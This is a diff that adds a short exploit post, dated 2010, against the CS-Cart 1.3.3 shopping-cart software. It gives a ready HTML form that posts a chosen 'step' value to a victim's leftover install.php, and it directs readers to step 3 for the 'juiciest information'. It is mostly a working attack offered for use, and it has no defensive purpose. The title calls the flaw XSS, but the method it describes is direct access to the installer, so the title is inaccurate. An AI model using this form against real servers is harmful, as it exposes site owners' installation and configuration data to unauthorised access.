@@ -1,0 +1,18 @@
+# Exploit Title: [CS CART 1.3.3 INSTALL.PHP XSS]
+# Date: [2010-09-08]
+# Author: [LogicGate]
+# Software Link: [http://cs-cart.smartcode.com/]
+# Version: [1.3.3]
+# Tested on: [N/A]
+# CVE : [N/A]
+
+If "install.php" was not removed after installation simply make an html file with the following code and replace <Victim Server> by the PATH to "install.php" example:"http://www.nonexistant.com/install.php":
+
+<html>
+<form name="installform" method="post" action="http://<Victim Ip>/install.php">
+<input type="text" name="step">
+<input type="submit" id="nextbut" value="xss">
+</form>
+</html>
+
+After that open the HTML file you have just created and enter which ever step of the installation you would like to access. Step "3" is where the juiciest information is.
